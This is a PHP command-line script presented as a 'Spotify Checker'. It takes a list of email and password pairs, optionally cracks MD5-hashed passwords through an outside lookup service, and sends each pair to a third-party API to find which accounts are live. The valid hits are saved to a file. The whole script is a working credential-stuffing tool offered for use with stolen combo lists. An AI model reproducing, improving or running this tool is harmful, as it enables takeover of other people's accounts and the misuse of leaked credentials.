<?php
ini_set('date.timezone', 'America/Argentina/Buenos_Aires');
ob_implicit_flush(true);
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
echo "============================================\n";
echo "              Spotify Checker "; 
echo "\n============================================\n";
echo "Creador : \033[92mJkDev \n\033[0mAPI por   : \033[95mJkDev \033[0m\nTelegram  : @MrPopos2\n";
echo "============================================\n";

echo "Apikey \t\t: ";
$apikey = trim(fgets(STDIN));

echo "Delim \t\t: ";
$delim = trim(fgets(STDIN));

echo "List \t\t: ";
$list = trim(fgets(STDIN));

echo "Sleep \t\t: ";
$tidur = trim(fgets(STDIN));

echo "============================================\n";
$file = file_get_contents("$list");
$data = explode("\n",$file);
$jumlah= 0; $live=0; $mati=0;
for($a=0;$a<count($data);$a++){
	$date = date("h:i:sa");
        $data1 = explode($delim,$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
	if($argv[2]=="--md5"){
		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
		$json = json_decode($get,true);
		$pass = $json['password'];
	}
	$cek = @file_get_contents("https://upgan-rexxxz.c9users.io/api.php?email=$email&pass=$pass&apikey=$apikey");
	if (strpos($cek,"Spotify")) {
 if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
  $h=fopen("spotify-live.txt","a");
  fwrite($h,$cek."\n");
  fclose($h);
  }
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[92m [Live] \033[0m".$cek; $live+=1;
  }else{
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[91m [Diee] \033[0m".$cek; $mati+=1;
	}
	ob_flush();
	sleep($tidur);
   print($cek."\n");
}
	echo "============================================\n";
	print ("Account \033[1;34mChecked : " . count($data). "\033[0m\n");
	echo "Account \033[92mLive: $live \033[0mand account \033[91mDie: $mati\033[0m \n";
	echo "\033[1;96mJ\033[0m\033[1;97mk\033[0m\033[1;93mD\033[0m\033[1;97mE\033[0m\033[1;96mV\033[0m";
?>